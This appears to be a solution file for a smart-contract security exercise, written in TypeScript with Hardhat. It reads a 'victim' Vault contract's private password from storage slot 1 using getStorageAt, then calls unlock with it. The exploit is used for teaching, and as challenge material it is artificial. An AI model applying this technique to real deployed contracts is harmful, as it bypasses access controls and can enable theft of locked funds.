import { expect } from "chai";
import { utils } from "ethers";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  /* 
    Add code here that will help you pass the test
    Note: Unlock without using the string "A very strong password"
    Unlock the vault by somehow reading the private password from 
    Vault directly
  */
  const slot1 = await ethers.provider.getStorageAt(victim.address, 1);
  console.log(slot1);

  // slot 1 is the password
  await victim.unlock(slot1);
};

export default helper;
